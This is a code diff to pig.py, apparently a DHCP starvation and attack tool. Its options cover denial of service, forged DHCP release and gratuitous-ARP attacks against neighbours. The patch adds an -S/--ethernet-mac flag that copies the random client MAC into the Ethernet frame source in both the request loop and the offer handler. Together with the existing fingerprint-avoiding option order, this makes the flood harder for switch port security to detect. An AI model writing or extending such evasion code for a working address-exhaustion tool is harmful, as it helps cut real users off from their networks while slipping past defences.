@@ -8,7 +8,7 @@ Doc:
 
 
 Usage:
-    pig.py [-h -v -6 -1 -s -f -t -a -i -o -l -x -y -z -g -r -n -c ] <interface>
+    pig.py [-h -v -6 -1 -s -S -f -t -a -i -o -l -x -y -z -g -r -n -c ] <interface>
   
 Options:
     -h, --help                     <-- you are here :)
@@ -21,6 +21,7 @@ Options:
     -1, --v6-rapid-commit          ... enable RapidCommit (2way ip assignment instead of 4way) (off)
     
     -s, --client-src               ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
+    -S, --ethernet-mac             ... Use identical MAC addresses on the Ethernet framd and DHCP frame (off)
     -O, --request-options          ... option-codes to request e.g. 21,22,23 or 12,14-19,23 (Default: 0-80)
     
     -f, --fuzz                     ... randomly fuzz packets (off)
@@ -148,14 +149,14 @@ REQUEST_OPTS = range(80)
 
 
 def checkArgs():
-    global SHOW_ARP, SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT,SHOW_LEASE_CONFIRM,REQUEST_OPTS
+    global SHOW_ARP, SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, ETHERNET_MAC, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT,SHOW_LEASE_CONFIRM,REQUEST_OPTS
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "haiolx:y:z:6fgrns:c1v:t:O:", ["help","show-arp","show-icmp",
-                                                                      "show-options","timeout-threads=","timeout-dos=",
-                                                                      "timeout-dhcprequest=", "neighbors-scan-arp",
-                                                                      "neighbors-attack-release", "neighbors-attack-garp",
-                                                                      "fuzz","ipv6","client-src=","color","v6-rapid-commit",
-                                                                      "verbosity=","threads=", "show-lease-confirm","request-options="])
+        opts, args = getopt.getopt(sys.argv[1:], "haiolx:y:z:6fgrnsSc1v:t:O:", ["help","show-arp","show-icmp",
+                                                                                  "show-options","timeout-threads=","timeout-dos=",
+                                                                                  "timeout-dhcprequest=", "neighbors-scan-arp",
+                                                                                  "neighbors-attack-release", "neighbors-attack-garp",
+                                                                                  "fuzz","ipv6","client-src=","ethernet-mac","color","v6-rapid-commit",
+                                                                                  "verbosity=","threads=", "show-lease-confirm","request-options="])
     except getopt.GetoptError as err:
         # print help information and exit:
         print(str(err))  # will print something like "option -a not recognized"
@@ -191,6 +192,8 @@ def checkArgs():
             DO_ARP = True
         elif o in ("-s", "--client-src"):
             MAC_LIST = a.strip().split(",")
+        elif o in ("-S", "--ethernet-mac"):
+            ETHERNET_MAC = True
         elif o in ("-c", "--color"):
             DO_COLOR = True
         elif o in ("-1", "--v6-rapid-commit"):
@@ -489,11 +492,14 @@ class send_dhcp(threading.Thread):
         self.kill_received = False
 
     def run(self):
-       global TIMEOUT, dhcpdos, REQUEST_OPTS
+       global TIMEOUT, dhcpdos, REQUEST_OPTS, ETHERNET_MAC
        while not self.kill_received and not dhcpdos:
             m = randomMAC()
             myxid = random.randint(1, 900000000)
-            mymac = get_if_hwaddr(conf.iface)
+            if ETHERNET_MAC:
+                mymac = m
+            else:
+                mymac = get_if_hwaddr(conf.iface)
             hostname = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
             # Mac OS options order to avoid DHCP fingerprinting
             myoptions = [
@@ -552,7 +558,7 @@ class sniff_dhcp(threading.Thread):
             if not MODE_FUZZ and self.dhcpcount==5: dhcpdos = True
           
     def detect_dhcp(self, pkt):
-        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise, SHOW_LEASE_CONFIRM,REQUEST_OPTS
+        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise, SHOW_LEASE_CONFIRM,REQUEST_OPTS, ETHERNET_MAC
         if MODE_IPv6:
             if DHCP6_Advertise in pkt:
                 self.dhcpcount = 0
@@ -593,11 +599,14 @@ class sniff_dhcp(threading.Thread):
                         if opt[0] == 'subnet_mask':
                             subnet=opt[1]
                             break
-                    mymac = get_if_hwaddr(conf.iface)
                     myip=pkt[BOOTP].yiaddr
                     sip=pkt[BOOTP].siaddr
                     localxid=pkt[BOOTP].xid
                     localm=unpackMAC(pkt[BOOTP].chaddr)
+                    if ETHERNET_MAC:
+                        mymac = localm
+                    else:
+                        mymac = get_if_hwaddr(conf.iface)
                     myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
                     LOG(type="<--", message= "DHCP_Offer   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+localm+"]")
     
